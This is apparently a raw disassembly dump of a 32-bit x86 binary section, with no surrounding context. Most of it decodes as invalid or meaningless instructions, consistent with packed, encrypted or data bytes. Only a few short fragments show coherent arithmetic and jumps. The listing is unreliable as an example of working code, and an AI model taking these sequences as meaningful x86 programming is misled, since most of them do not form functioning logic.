  40b29a:	xchg   esp,eax
  40b29b:	dec    esi
  40b29c:	fisttp WORD PTR [ecx+0x79]
  40b29f:	inc    ebp
  40b2a0:	out    dx,eax
  40b2a1:	mov    esp,0xd3d31e60
  40b2a6:	dec    eax
  40b2a7:	dec    ebp
  40b2a8:	xor    al,0xc5
  40b2aa:	mov    WORD PTR [ecx+0x63],ds
  40b2ad:	sbb    bh,dh
  40b2af:	aam    0xff
  40b2b1:	push   esp
  40b2b2:	sbb    BYTE PTR [eax],al
  40b2b4:	sub    bh,BYTE PTR [esi+0x78cf3d59]
  40b2ba:	mov    dh,0xa4
  40b2bc:	fst    DWORD PTR [edi-0x78]
  40b2bf:	or     eax,0xb7e7238a
  40b2c4:	cmc    
  40b2c5:	jmp    0x40b2a1
  40b2c7:	test   al,0xc4
  40b2c9:	sbb    al,0x52
  40b2cb:	(bad)  
  40b2cc:	jmp    0xe294c759
  40b2d1:	jecxz  0x40b2bc
  40b2d3:	xor    edi,DWORD PTR [ebx-0xc]
  40b2d6:	rcl    DWORD PTR [edx-0x1cb17646],1
  40b2dc:	outs   dx,DWORD PTR ds:[esi]
  40b2dd:	jl     0x40b31f
  40b2df:	lods   eax,DWORD PTR ds:[esi]
  40b2e0:	mov    esi,0xd8802bd9
  40b2e5:	iret   
  40b2e6:	mov    ecx,DWORD PTR [esi]
  40b2e8:	jp     0x40b270
  40b2ea:	mov    al,ds:0x36e8c8c5
  40b2ef:	lods   eax,DWORD PTR ds:[esi]
  40b2f0:	addr16 inc ebx
  40b2f2:	or     eax,0xd785df07
  40b2f7:	jg     0x40b2d8
  40b2f9:	mov    ecx,0xe34a7138
  40b2fe:	adc    DWORD PTR [esi+0x27],esi
  40b301:	ins    DWORD PTR es:[edi],dx
  40b302:	jle    0x40b34a
  40b304:	adc    ch,cl
  40b306:	pop    edx
  40b307:	js     0x40b296
  40b309:	xor    dl,BYTE PTR [eax+0x34]
  40b30c:	sub    ecx,esi
  40b30e:	cmp    DWORD PTR [esi],0x97fa4c6e
  40b314:	jno    0x40b2ea
  40b316:	ror    DWORD PTR [eax+0x779e8787],cl
  40b31c:	push   eax
  40b31d:	fdiv   DWORD PTR [ebp+0x78179a80]
  40b323:	ins    BYTE PTR es:[edi],dx
  40b324:	mov    BYTE PTR [ebp-0x29],cl
  40b327:	shl    BYTE PTR [ebp-0x48a6df98],0xe4
  40b32e:	jns    0x40b2bb
  40b330:	clc    
  40b331:	inc    eax
  40b332:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b333:	daa    
  40b334:	fidivr DWORD PTR ds:0xb1b5871f
  40b33a:	push   0xe9f17ccb
  40b33f:	sar    BYTE PTR [esi+0x79bae478],0xbd
  40b346:	nop
  40b347:	sbb    ebp,ebx
  40b349:	in     eax,dx
  40b34a:	adc    al,0x1a
  40b34c:	out    dx,eax
  40b34d:	not    bh
  40b34f:	push   edx
  40b350:	popa   
  40b351:	sbb    al,0xc6
  40b353:	mov    edi,0x6561fd48
  40b358:	nop
  40b359:	or     ebx,ebx
  40b35b:	(bad)  
  40b35c:	mul    ch
  40b35e:	test   DWORD PTR [eax+0xd],esi
  40b361:	cmp    ebx,edx
  40b363:	ja     0x40b371
  40b369:	mov    edx,DWORD PTR [ebp-0x30]
  40b36c:	jmp    0x40baa7
  40b371:	mov    edx,DWORD PTR [ebp-0x38]
  40b374:	mov    edi,DWORD PTR [ebp-0x4]
  40b377:	xor    edx,eax
  40b379:	xor    edi,eax
  40b37b:	add    edi,ecx
  40b37d:	add    edx,ecx
  40b37f:	imul   edx,edi
  40b382:	mov    edi,DWORD PTR [ebp-0x8]
  40b385:	mov    ebx,DWORD PTR [ebp-0x10]
  40b388:	sub    ebx,edi
  40b38a:	cmp    ebx,edx
  40b38c:	ja     0x40b39a
  40b392:	mov    edx,DWORD PTR [ebp-0x34]
  40b395:	jmp    0x40baa7
  40b39a:	mov    edx,DWORD PTR [ebp-0x3c]
  40b39d:	mov    edi,DWORD PTR [ebp-0x4]
  40b3a0:	jmp    0x40b713
  40b3a5:	ret    0x2e25
  40b3a8:	dec    ebx
  40b3a9:	icebp  
  40b3aa:	dec    ebx
  40b3ab:	ins    DWORD PTR es:[edi],dx
  40b3ac:	mov    ebp,0x68a70588
  40b3b1:	hlt    
  40b3b2:	xchg   ebp,eax
  40b3b3:	or     eax,0x7cfa612b
  40b3b8:	jl     0x40b384
  40b3ba:	jns    0x40b438
  40b3bc:	jl     0x40b37a
  40b3be:	js     0x40b3a4
  40b3c0:	mov    cs,WORD PTR [ecx-0x5068cf35]
  40b3c6:	pusha  
  40b3c7:	xchg   esi,eax
  40b3c8:	push   0xaf475768
  40b3cd:	push   eax
  40b3ce:	(bad)  
  40b3cf:	mov    bh,0x93
  40b3d1:	fnstsw WORD PTR ds:[edx]
  40b3d4:	mov    eax,0x7f34a185
  40b3d9:	mov    dh,0x9b
  40b3db:	cmp    DWORD PTR [edi+0x261a78b0],esi
  40b3e1:	mov    eax,ds:0xbf5ff303
  40b3e6:	lods   al,BYTE PTR ds:[esi]
  40b3e7:	js     0x40b41f
  40b3e9:	jle    0x40b390
  40b3eb:	sahf   
  40b3ec:	adc    al,0x91
  40b3ee:	jmp    0x8bc8:0xb6072ebf
  40b3f5:	iret   
  40b3f6:	scas   eax,DWORD PTR es:[edi]
  40b3f7:	dec    esp
  40b3f8:	scas   al,BYTE PTR es:[edi]
  40b3f9:	ret    
  40b3fa:	add    eax,DWORD PTR [esi-0x12f76911]
  40b400:	mov    ch,BYTE PTR [edx-0x75]
  40b403:	add    BYTE PTR [esi+esi*2+0xf],ah
  40b407:	mov    dh,0x8c
  40b409:	inc    esp
  40b40a:	fdivr  st,st(0)
  40b40c:	xor    eax,0x3fcd17e4
  40b411:	outs   dx,BYTE PTR ds:[esi]
  40b412:	fild   DWORD PTR [ecx]
  40b414:	(bad)  
  40b415:	enter  0x396,0xb
  40b419:	mov    edi,?
  40b41b:	mul    BYTE PTR [eax]
  40b41d:	in     eax,dx
  40b41e:	stos   DWORD PTR es:[edi],eax
  40b41f:	shl    DWORD PTR [eax-0x64],1
  40b422:	popf   
  40b423:	ror    BYTE PTR [eax],1
  40b425:	sar    DWORD PTR [ebx],1
  40b427:	fldenv [eax*8+0x22ce54f6]
  40b42e:	jno    0x40b3f1
  40b430:	ins    BYTE PTR es:[edi],dx
  40b431:	rol    DWORD PTR [eax+0x7c],0x2d
  40b435:	mov    fs,edx
  40b437:	xchg   BYTE PTR [esi-0x19],cl
  40b43a:	iret   
  40b43b:	jno    0x40b3c6
  40b43d:	and    esp,esp
  40b43f:	pop    eax
  40b440:	xchg   ebp,eax
  40b441:	sbb    BYTE PTR [ecx+0x6b74fddc],dh
  40b447:	scas   al,BYTE PTR es:[edi]
  40b448:	push   ebp
  40b449:	jmp    DWORD PTR [eax+esi*4]
  40b44c:	cmp    DWORD PTR [esi+edx*4],esp
  40b44f:	dec    esi
  40b450:	arpl   WORD PTR [ebp+ebx*1+0x32],bp
  40b454:	add    al,0x34
  40b456:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b457:	sub    esp,DWORD PTR [ecx]
  40b459:	mov    eax,0x8c244437
  40b45e:	and    ah,ah
  40b460:	sbb    eax,0x128582eb
  40b465:	xchg   ebx,eax
  40b466:	mov    ebx,0xe28e872e
  40b46b:	add    eax,0x7a8f6574
  40b470:	call   0xb575a48f
  40b475:	inc    esi
  40b476:	mov    ch,0x39
  40b478:	or     BYTE PTR [eax+0x45],cl
  40b47b:	fdivr  st(6),st
  40b47d:	mul    esp
  40b47f:	cwde   
  40b480:	mov    eax,ds:0x37b6e4ff
  40b485:	popa   
  40b486:	aam    0x7d
  40b488:	pop    eax
  40b489:	ds xchg esi,eax
  40b48b:	cld    
  40b48c:	xor    DWORD PTR [ebx+0x1d],esp
  40b48f:	dec    edi
  40b490:	retf   
  40b491:	pop    ebp
  40b492:	in     eax,0x43
  40b494:	sub    al,BYTE PTR [edx-0xa]
  40b497:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b498:	test   al,0x39
  40b49a:	mov    al,ds:0x23c4a184
  40b49f:	shl    BYTE PTR [eax-0x6a],1
  40b4a2:	pop    ebx
  40b4a3:	imul   esp,DWORD PTR [ebp-0x9],0xffffffbb
  40b4a7:	pop    ebx
  40b4a8:	mov    ah,dl
  40b4aa:	push   ecx
  40b4ab:	jnp    0x40b438
  40b4ad:	and    al,ah
  40b4af:	inc    edx
  40b4b0:	retf   0xe24b
  40b4b3:	push   ecx
  40b4b4:	dec    ebp
  40b4b5:	(bad)  
  40b4b6:	cmp    eax,0x719bf0c
  40b4bb:	outs   dx,DWORD PTR ds:[esi]
  40b4bc:	loopne 0x40b50b
  40b4be:	hlt    
  40b4bf:	jmp    0xf06b2803
  40b4c4:	outs   dx,DWORD PTR ds:[esi]
  40b4c5:	out    dx,eax
  40b4c6:	ds dec esi
  40b4c8:	mov    ds:0x5de2634c,eax
  40b4cd:	shr    DWORD PTR [ebx+0x5],1
  40b4d0:	mov    ds:0xd6c986e6,al
  40b4d5:	mov    fs,WORD PTR [eax+eiz*4+0x541739fc]
  40b4dc:	pop    eax
  40b4dd:	nop
  40b4de:	dec    eax
  40b4df:	in     al,0xf1
  40b4e1:	and    al,0xb5
  40b4e3:	jg     0x40b524
  40b4e5:	jae    0x40b4e9
  40b4e7:	add    dh,BYTE PTR [eax+0x76]
  40b4ea:	adc    BYTE PTR [edx-0x2a],0xec
  40b4ee:	add    eax,0xfccd0c4a
  40b4f3:	fistp  DWORD PTR [esi]
  40b4f5:	(bad)  
  40b4f6:	xor    al,0x53
  40b4f8:	ss (bad) 
  40b4fa:	iret   
  40b4fb:	(bad)  
  40b4fc:	imul   ecx,ebp,0xffffffda
  40b4ff:	adc    BYTE PTR [edx+0x6d],ch
  40b502:	call   0xce7642e8
  40b507:	jo     0x40b49c
  40b509:	xchg   BYTE PTR [ecx+0x60],ch
  40b50c:	or     al,0x8
  40b50e:	ss xor al,0xf0
  40b511:	lock lods al,BYTE PTR ds:[esi]
  40b513:	cs jmp 0x40b542
  40b516:	aas    
  40b517:	jmp    0xfc45:0x96ddf35b
  40b51e:	aaa    
  40b51f:	sub    eax,ecx
  40b521:	in     al,dx
  40b522:	stos   DWORD PTR es:[edi],eax
  40b523:	mov    al,ds:0x2979bc75
  40b528:	icebp  
  40b529:	sub    dh,BYTE PTR [edx+0x328d042d]
  40b52f:	sub    BYTE PTR [eax],ah
  40b531:	push   esp
  40b532:	push   edi
  40b533:	dec    ebp
  40b534:	xchg   esp,eax
  40b535:	and    dh,BYTE PTR [edi+0x48ec601b]
  40b53b:	adc    al,0xc3
  40b53d:	xchg   edi,eax
  40b53e:	das    
  40b53f:	das    
  40b540:	xor    eax,0xe5219f46
  40b545:	mov    esp,ebp
  40b547:	(bad)  
  40b549:	sub    esp,edi
  40b54b:	pusha  
  40b54c:	xchg   ecx,eax
  40b54d:	and    BYTE PTR [edx+0x197c99e3],dh
  40b553:	sub    ch,BYTE PTR [ebp+0x786498a7]
  40b559:	pop    es
  40b55a:	test   al,0x73
  40b55c:	add    al,0xcc
  40b55e:	sub    ah,BYTE PTR [ecx+0x2fc4bfa2]
  40b564:	dec    eax
  40b565:	arpl   WORD PTR [eax+eax*1-0x62],di
  40b569:	pop    es
  40b56a:	push   edx
  40b56b:	mov    edi,0xade13c81
  40b570:	mov    dl,al
  40b572:	mov    ds:0x7bb57a63,eax
  40b577:	jp     0x40b5f3
  40b579:	pop    edx
  40b57a:	cli    
  40b57b:	xchg   ecx,eax
  40b57c:	cld    
  40b57d:	push   ebx
  40b57e:	pop    esp
  40b57f:	xchg   ebp,eax
  40b580:	jp     0x40b55f
  40b582:	mov    cl,BYTE PTR [esi]
  40b584:	lods   al,BYTE PTR ds:[esi]
  40b585:	mov    eax,ds:0xb39aa4fd
  40b58a:	lds    esp,FWORD PTR [ebp-0x59]
  40b58d:	and    al,0x6f
  40b58f:	pop    edx
  40b590:	mov    eax,0xd4c0d845
  40b595:	cwde   
  40b596:	bound  eax,QWORD PTR [edx]
  40b598:	mov    esi,0x3fa41327
  40b59d:	sbb    eax,0xda2721f8
  40b5a2:	es popf 
  40b5a4:	repnz add eax,0x46bf58ae
  40b5aa:	mov    BYTE PTR [edx-0x5d],al
  40b5ad:	test   eax,0xb1201e00
  40b5b2:	or     al,0x52
  40b5b4:	(bad)  
  40b5b5:	push   ecx
  40b5b6:	sbb    BYTE PTR [ecx+esi*2+0x51],cl
  40b5ba:	jnp    0x40b5a1
  40b5bc:	xor    dl,BYTE PTR [eax-0x74]
  40b5bf:	jae    0x40b5c0
  40b5c1:	xlat   BYTE PTR ds:[ebx]
  40b5c2:	hlt    
  40b5c3:	out    0x23,eax
  40b5c5:	xchg   ebx,eax
  40b5c6:	jle    0x40b5b2
  40b5c8:	scas   eax,DWORD PTR es:[edi]
  40b5c9:	sub    eax,ecx
  40b5cb:	mov    DWORD PTR [ebx],0xaa0e0e3
  40b5d1:	sub    BYTE PTR [eax+esi*2],dl
  40b5d4:	mov    ecx,0x569fd338
  40b5d9:	mov    al,ds:0xea01e8b2
  40b5de:	mov    edx,esp
  40b5e0:	clc    
  40b5e1:	xlat   BYTE PTR ds:[ebx]
  40b5e2:	je     0x40b5bf
  40b5e4:	dec    edi
  40b5e5:	ja     0x40b598
  40b5e7:	push   ecx
  40b5e8:	aad    0x80
  40b5ea:	mov    dl,BYTE PTR [ecx-0x4ea2c152]
  40b5f0:	(bad)  
  40b5f1:	loopne 0x40b665
  40b5f3:	imul   ebp,DWORD PTR [eax+0x6e],0x3f
  40b5f7:	mov    edi,0x5fbe8a3f
  40b5fc:	xchg   BYTE PTR [eax-0x2e],bh
  40b5ff:	xor    DWORD PTR ds:0xcac787a2,edi
  40b605:	cmp    eax,0xb24b314
  40b60a:	jbe    0x40b592
  40b60c:	cmp    eax,ebp
  40b60e:	or     al,BYTE PTR [esp+eax*4-0x16d8ba9e]
  40b615:	jl     0x40b5ee
  40b617:	adc    DWORD PTR [eax+edi*8+0x175f3e6],ebp
  40b61e:	popa   
  40b61f:	xchg   ebp,eax
  40b620:	mov    ah,bl
  40b622:	mov    WORD PTR [esi-0x40],cs
  40b625:	retf   0x5fb0
  40b628:	adc    edx,DWORD PTR ds:0x3344c325
  40b62e:	mov    ebp,0xf4c39558
  40b633:	fdivr  st,st(7)
  40b635:	aam    0x7b
  40b637:	lea    esi,[ebp-0x57]
  40b63a:	xchg   ebx,eax
  40b63b:	pop    ss
  40b63c:	push   ebp
  40b63d:	mov    edi,fs
  40b63f:	retf   0x5398
  40b642:	sbb    al,0xe8
  40b644:	inc    ecx
  40b645:	inc    esp
  40b646:	jae    0x40b5d2
  40b648:	icebp  
  40b649:	mov    WORD PTR [ecx-0x4f644eaa],ss
  40b64f:	stc    
  40b650:	sub    eax,0x507e3365
  40b655:	repz popf 
  40b657:	mov    al,ah
  40b659:	loop   0x40b609
  40b65b:	loop   0x40b6b1
  40b65d:	jmp    0x2676:0x12874553
  40b664:	div    BYTE PTR [edx]
  40b666:	loop   0x40b69a
  40b668:	shl    BYTE PTR [eax+edx*4],1
  40b66b:	ret    
  40b66c:	out    dx,eax
  40b66d:	mov    ebx,0x6db29cb6
  40b672:	xchg   esp,eax
  40b673:	dec    edx
  40b674:	lods   al,BYTE PTR ds:[esi]
  40b675:	xor    al,BYTE PTR [ebx-0x47]
  40b678:	out    0xfd,eax
  40b67a:	mov    edx,0x4d118fb2
  40b67f:	retf   0x913e
  40b682:	mov    cl,0xdf
  40b684:	or     ebx,ebx
  40b686:	or     DWORD PTR [edi-0x78b228d2],ebx
  40b68c:	push   ss
  40b68d:	mov    al,ds:0x23b3a1c0
  40b692:	ins    BYTE PTR es:[edi],dx
  40b693:	lahf   
  40b694:	arpl   WORD PTR gs:[eax],si
  40b697:	mov    al,0x9d
  40b699:	lock mov cl,0xb5
  40b69c:	pop    ebp
  40b69d:	push   ds
  40b69e:	pusha  
  40b69f:	sub    ebx,ebx
  40b6a1:	retf   
  40b6a2:	push   cs
  40b6a3:	and    ecx,ebx
  40b6a5:	inc    esp
  40b6a6:	xchg   esi,eax
  40b6a7:	xchg   edx,eax
  40b6a8:	fnsave [ebx+esi*8]
  40b6ab:	rcl    ebp,0xf4
  40b6ae:	add    BYTE PTR [eax+0x7c],cl
  40b6b1:	int    0xcb
  40b6b3:	popa   
  40b6b4:	mov    ch,BYTE PTR [ebp+0x143e2d98]
  40b6ba:	loope  0x40b674
  40b6bc:	push   ds
  40b6bd:	push   esi
  40b6be:	(bad)  
  40b6bf:	inc    eax
  40b6c0:	mov    ds:0xc8e7a869,eax
  40b6c5:	push   ds
  40b6c6:	inc    ebx
  40b6c7:	aaa    
  40b6c8:	scas   eax,DWORD PTR es:[edi]
  40b6c9:	jo     0x40b663
  40b6cb:	add    eax,0xaa68cf1c
  40b6d0:	dec    edx
  40b6d1:	cwde   
  40b6d2:	xlat   BYTE PTR ds:[ebx]
  40b6d3:	(bad)  
  40b6d4:	popa   
  40b6d5:	in     al,dx
  40b6d6:	loope  0x40b67d
  40b6d8:	inc    edx
  40b6d9:	sbb    cl,0xf
  40b6dc:	xor    ch,ch
  40b6de:	adc    BYTE PTR [eax+eax*1+0x18],al
  40b6e2:	xchg   esp,eax
  40b6e3:	loop   0x40b719
  40b6e5:	or     edx,DWORD PTR [edi-0x67255ce7]
  40b6eb:	(bad)  
  40b6ec:	cmp    eax,0xc0686614
  40b6f1:	fst    QWORD PTR [ecx-0x64]
  40b6f4:	push   cs
  40b6f5:	mov    al,0x85
  40b6f7:	xor    BYTE PTR [ebx-0x52e0ae],al
  40b6fd:	mov    gs,esi
  40b6ff:	inc    esi
  40b700:	pop    esi
  40b701:	sub    ebx,eax
  40b703:	push   esi
  40b704:	sar    BYTE PTR [ebx],1
  40b706:	xor    BYTE PTR [edi],0x4
  40b709:	push   edx
  40b70a:	dec    eax
  40b70b:	repnz cwde 
  40b70d:	xor    eax,0xa29e0ccb
  40b712:	xor    dx,ax
  40b715:	xor    edi,eax
  40b717:	add    edx,ecx
  40b719:	add    edi,ecx
  40b71b:	imul   edx,edi
  40b71e:	mov    edi,DWORD PTR [ebp-0x8]
  40b721:	mov    ebx,DWORD PTR [ebp-0x10]
  40b724:	sub    ebx,edi
  40b726:	cmp    ebx,edx
  40b728:	mov    edx,DWORD PTR [ebp-0x38]
  40b72b:	jbe    0x40baa7
  40b731:	jmp    0x40baa4
  40b736:	dec    ecx
  40b737:	mov    cl,0xec
  40b739:	cwde   
  40b73a:	hlt    
  40b73b:	ins    DWORD PTR es:[edi],dx
  40b73c:	push   ebp
  40b73d:	jge    0x40b6d6
  40b73f:	loop   0x40b70e
  40b741:	loope  0x40b75a
  40b743:	in     eax,dx
  40b744:	mov    cl,0x3d
  40b746:	aas    
  40b747:	xchg   BYTE PTR [esp+edi*2-0x36],bh
  40b74b:	jns    0x40b7c9
  40b74d:	jl     0x40b738
  40b74f:	test   ch,dl
  40b751:	(bad)  
  40b752:	jmp    0x6babb532
  40b757:	mov    ch,0x4
  40b759:	ins    BYTE PTR es:[edi],dx
  40b75a:	jle    0x40b776
  40b75c:	xor    al,0x4b
  40b75e:	push   ds
  40b75f:	and    BYTE PTR ss:[esi+0x599ea4eb],bl
  40b766:	fld    TBYTE PTR [edi+0xa7edc07]
  40b76c:	mov    dh,0x49
  40b76e:	and    BYTE PTR [ebp+0x56ca206],0xb7
  40b775:	push   es
  40b776:	out    dx,eax
  40b777:	out    0xd2,al
  40b779:	fwait
  40b77a:	xor    bh,BYTE PTR [esp+esi*1]
  40b77d:	leave  
  40b77e:	push   edx
  40b77f:	int3   
  40b780:	push   cs
  40b781:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b782:	clc    
  40b783:	inc    esi
  40b784:	int3   
  40b785:	pop    ebp
  40b786:	in     al,dx
  40b787:	xchg   ecx,eax
  40b788:	adc    eax,0x5dc2aaa7
  40b78d:	ja     0x40b7b4
  40b78f:	cmc    
  40b790:	mov    dh,BYTE PTR [ecx+0x5e7e2110]
  40b796:	xchg   edx,eax
  40b797:	add    DWORD PTR [ebp+0x75d77330],edx
  40b79d:	or     bl,BYTE PTR [edx]
  40b79f:	sahf   
  40b7a0:	outs   dx,BYTE PTR ds:[esi]
  40b7a1:	push   ebp
  40b7a2:	mov    edx,eax
  40b7a4:	sbb    bh,BYTE PTR [ebp-0x81b6391]
  40b7aa:	sbb    al,0x78
  40b7ac:	fnstenv [esi+0xb0262b1]
  40b7b2:	pop    ebp
  40b7b3:	jle    0x40b735
  40b7b5:	xor    ah,bh
  40b7b7:	dec    ecx
  40b7b8:	xchg   edi,eax
  40b7b9:	inc    esp
  40b7ba:	dec    ebx
  40b7bb:	cmp    bl,BYTE PTR [edi+0x5e1a730c]
  40b7c1:	inc    esp
  40b7c2:	inc    eax
  40b7c3:	sbb    bl,BYTE PTR [ebx]
  40b7c5:	jge    0x40b7c7
  40b7c7:	scas   al,BYTE PTR es:[edi]
  40b7c8:	xchg   ebx,eax
  40b7c9:	scas   al,BYTE PTR es:[edi]
  40b7ca:	rol    DWORD PTR [ebx],cl
  40b7cc:	sub    ebp,DWORD PTR [edx]
  40b7ce:	adc    al,0xe
  40b7d0:	out    dx,eax
  40b7d1:	push   0x49
  40b7d3:	jne    0x40b7e5
  40b7d5:	sbb    BYTE PTR [esi+0x51a7754c],0xe7
  40b7dc:	daa    
  40b7dd:	rcr    BYTE PTR ds:0xf928aa6e,0xea
  40b7e4:	fstp   DWORD PTR [ebp+edi*2+0x45]
  40b7e8:	jg     0x40b7b8
  40b7ea:	loop   0x40b83f
  40b7ec:	xchg   esi,eax
  40b7ed:	imul   eax,DWORD PTR [edi+eiz*2+0x6e],0xffffffba
  40b7f2:	aam    0xb6
  40b7f4:	add    DWORD PTR [edx-0x51],ebx
  40b7f7:	adc    ah,ch
  40b7f9:	test   BYTE PTR [ebx],al
  40b7fb:	es jl  0x40b783
  40b7fe:	push   0xffffffb0
  40b800:	and    DWORD PTR [eax],edi
  40b802:	xchg   DWORD PTR [edi+0xd8c7716],ecx
  40b808:	test   BYTE PTR [ebx+ebx*4],cl
  40b80b:	icebp  
  40b80c:	leave  
  40b80d:	and    ah,ah
  40b80f:	mov    ebx,0x8d45866e
  40b814:	inc    ebp
  40b815:	inc    esi
  40b816:	mov    edi,es
  40b818:	fwait
  40b819:	mov    al,ds:0x5c0001a2
  40b81e:	mov    ch,0xc5
  40b820:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b821:	ins    BYTE PTR es:[edi],dx
  40b822:	dec    ecx
  40b823:	jp     0x40b7d4
  40b825:	popf   
  40b826:	xchg   edi,eax
  40b827:	into   
  40b828:	cwde   
  40b829:	xchg   DWORD PTR [esp+ecx*8],ebp
  40b82c:	pop    edi
  40b82d:	stos   DWORD PTR es:[edi],eax
  40b82e:	jmp    0xb2e06c95
  40b833:	jmp    0x5ed4:0xe55f7fcf
  40b83a:	lods   al,BYTE PTR ds:[esi]
  40b83b:	daa    
  40b83c:	push   edi
  40b83d:	out    dx,eax
  40b83e:	rcl    BYTE PTR [ebx],cl
  40b840:	xchg   ebx,eax
  40b841:	jmp    0x40b861
  40b843:	out    dx,eax
  40b844:	call   FWORD PTR [esp+ecx*8+0x33]
  40b848:	pop    es
  40b849:	jmp    FWORD PTR ds:0x51a1f878
  40b84f:	loopne 0x40b86a
  40b851:	add    eax,0xd33e2f58
  40b856:	push   esi
  40b857:	pop    ss
  40b858:	cmp    cl,BYTE PTR [ebp-0x56]
  40b85b:	daa    
  40b85c:	ins    BYTE PTR es:[edi],dx
  40b85d:	outs   dx,BYTE PTR ds:[esi]
  40b85e:	mov    eax,0x78af7075
  40b864:	fadd   QWORD PTR [eax-0x404c5a14]
  40b86a:	mov    esi,0x597e28ce
  40b86f:	ret    
  40b870:	in     eax,0xb0
  40b872:	nop
  40b873:	push   edx
  40b874:	addr16 inc edi
  40b876:	mov    ds:0xdf47085d,al
  40b87b:	add    eax,0xd5a7a6b7
  40b880:	and    BYTE PTR [edx-0x6cd1dbe5],bl
  40b886:	pop    ds
  40b887:	shr    DWORD PTR [edx-0x1c],cl
  40b88a:	out    dx,al
  40b88b:	std    
  40b88c:	rcr    BYTE PTR [esi+0x1ee81885],cl
  40b892:	pop    es
  40b893:	jp     0x40b877
  40b895:	shl    DWORD PTR [edx+0x28abab72],cl
  40b89b:	(bad)  
  40b89c:	loopne 0x40b885
  40b89e:	inc    eax
  40b89f:	pop    ebp
  40b8a0:	inc    ebp
  40b8a1:	push   esi
  40b8a2:	lods   eax,DWORD PTR ds:[esi]
  40b8a3:	mov    dh,0xce
  40b8a5:	jl     0x40b8ba
  40b8a7:	test   eax,0xa4d2b893
  40b8ac:	jno    0x40b847
  40b8ae:	gs lock inc eax
  40b8b1:	stos   BYTE PTR es:[edi],al
  40b8b2:	push   es
  40b8b3:	mov    eax,DWORD PTR [ecx]
  40b8b5:	int3   
  40b8b6:	lea    edx,[edx-0x6f7363cf]
  40b8bc:	mov    al,0xeb
  40b8be:	mov    ah,0x71
  40b8c0:	js     0x40b887
  40b8c2:	shr    BYTE PTR cs:[ebp+0x4d3b697a],1
  40b8c9:	add    DWORD PTR [esi+0x62],ebx
  40b8cc:	add    eax,0xc213489d
  40b8d1:	xchg   edi,eax
  40b8d2:	lahf   
  40b8d3:	ret    
  40b8d4:	out    0x6d,eax
  40b8d6:	stc    
  40b8d7:	adc    DWORD PTR [ecx],0x7ade8d2f
  40b8dd:	leave  
  40b8de:	int3   
  40b8df:	mov    bl,0x82
  40b8e1:	mov    al,0x63
  40b8e3:	push   edi
  40b8e4:	cmp    DWORD PTR [ecx+0x45],ebp
  40b8e7:	ja     0x40b93e
  40b8e9:	loope  0x40b8fc
  40b8eb:	arpl   WORD PTR [edi],bp
  40b8ed:	mov    edx,0x9184ddc2
  40b8f2:	test   BYTE PTR [esi+0x13],dh
  40b8f5:	mov    al,0xfa
  40b8f7:	test   eax,0x82069d54
  40b8fc:	mov    edi,0x7dc7d6be
  40b901:	dec    ebp
  40b902:	xor    al,0xc7
  40b904:	push   0x80b87cd3
  40b909:	mov    ds:0x26e53b8d,al
  40b90e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b90f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b910:	leave  
  40b911:	pop    ss
  40b912:	xor    ch,dh
  40b914:	pop    ebx
  40b915:	mov    dl,0x1c
  40b917:	xchg   DWORD PTR gs:[edx+0x14],ecx
  40b91b:	mov    ch,0x6b
  40b91d:	xchg   ecx,eax
  40b91e:	cmp    al,0xc2
  40b920:	test   al,0xa5
  40b922:	imul   esp,DWORD PTR [edi-0x71345049],0xede36faa
  40b92c:	inc    ch
  40b92e:	call   0x876def28
  40b933:	and    bh,al
  40b935:	call   0x5a97:0x15188c00
  40b93c:	push   ss
  40b93d:	push   ebp
  40b93e:	pop    ebp
  40b93f:	jmp    0x3854:0x2eff8088
  40b946:	into   
  40b947:	out    0x43,eax
  40b949:	mov    ah,0x21
  40b94b:	mov    ebp,0x1d87afe0
  40b950:	dec    ebp
  40b951:	jge    0x40b9bb
  40b953:	jae    0x40b9cb
  40b955:	sbb    eax,0x79f2420e
  40b95a:	jl     0x40b936
  40b95c:	jne    0x40b919
  40b95e:	leave  
  40b95f:	ss mov al,0x11
  40b962:	push   esi
  40b963:	lds    ebx,FWORD PTR [ebx-0x39ffe16d]
  40b969:	daa    
  40b96a:	push   edi
  40b96b:	lods   eax,DWORD PTR ds:[esi]
  40b96c:	inc    edx
  40b96d:	jne    0x40b9ec
  40b96f:	pop    ds
  40b970:	imul   esp,DWORD PTR [esi-0x41],0x4c
  40b974:	pop    esp
  40b975:	xchg   ebx,eax
  40b976:	lahf   
  40b977:	jmp    0xdfddfd78
  40b97c:	pop    eax
  40b97d:	adc    BYTE PTR [eax],0x7a
  40b980:	(bad)  
  40b981:	push   0x2c
  40b983:	cmp    DWORD PTR [ebp-0x21],ecx
  40b986:	fidivr WORD PTR [ecx-0x813374e]
  40b98c:	in     al,dx
  40b98d:	cmp    al,0xd0
  40b98f:	mov    ss,WORD PTR ds:0x4d474c09
  40b995:	jle    0x40ba03
  40b997:	cmp    bh,BYTE PTR [edi+0x71f4cfbb]
  40b99d:	push   edi
  40b99e:	pop    ebp
  40b99f:	mov    ds:0x14c1ba4a,al
  40b9a4:	jb     0x40b944
  40b9a6:	daa    
  40b9a7:	push   ss
  40b9a8:	xlat   BYTE PTR ds:[ebx]
  40b9a9:	loop   0x40b96e
  40b9ab:	adc    BYTE PTR [edx+eiz*4],ch
  40b9ae:	loope  0x40b9d1
  40b9b0:	pop    ds
  40b9b1:	fs test eax,0x7c933707
  40b9b7:	jmp    0x40b986
  40b9b9:	addr16 aaa 
  40b9bb:	lock fdivr DWORD PTR ds:0x7338b6b3
  40b9c2:	stc    
  40b9c3:	add    al,0xe7
  40b9c5:	repnz push edi
  40b9c7:	mov    BYTE PTR [esp+edi*4],dh
  40b9ca:	sti    
  40b9cb:	and    eax,DWORD PTR [ebp*8+0x332d5c7b]
  40b9d2:	scas   al,BYTE PTR es:[edi]
  40b9d3:	ficom  DWORD PTR [edx]
  40b9d5:	xchg   DWORD PTR [eax+0x53],edi
  40b9d8:	mov    cl,0xef
  40b9da:	dec    ebx
  40b9db:	call   0xf3e4:0xaf95e4fd
  40b9e2:	xor    BYTE PTR ds:0xfb20ca46,dh
  40b9e8:	xchg   BYTE PTR [esi+0xe],ch
  40b9eb:	imul   edx,DWORD PTR [esi+0x52396f9a],0xe20bf774
  40b9f5:	mov    eax,0xdad5924b
  40b9fa:	jo     0x40ba37
